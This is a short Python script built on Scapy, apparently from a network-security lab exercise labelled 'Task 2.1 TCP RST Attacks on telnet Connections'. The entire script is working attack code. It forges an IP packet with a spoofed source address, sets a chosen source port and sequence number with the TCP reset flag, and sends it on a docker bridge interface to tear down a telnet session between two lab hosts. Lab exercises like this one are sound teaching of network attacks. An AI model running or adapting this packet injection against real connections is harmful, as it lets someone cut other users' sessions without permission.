#!/usr/bin/env python3
# Task 2.1 -------------TCP RST Attacks on telnet Connections------------------------------
from scapy.all import *

ip = IP(src="10.9.0.6", dst="10.9.0.5")
tcp = TCP(sport= 55242, dport= 23, flags="R", seq=3868000186)
pkt = ip/tcp
ls(pkt)
send(pkt, iface='br-6dbb49d469fe', verbose=0)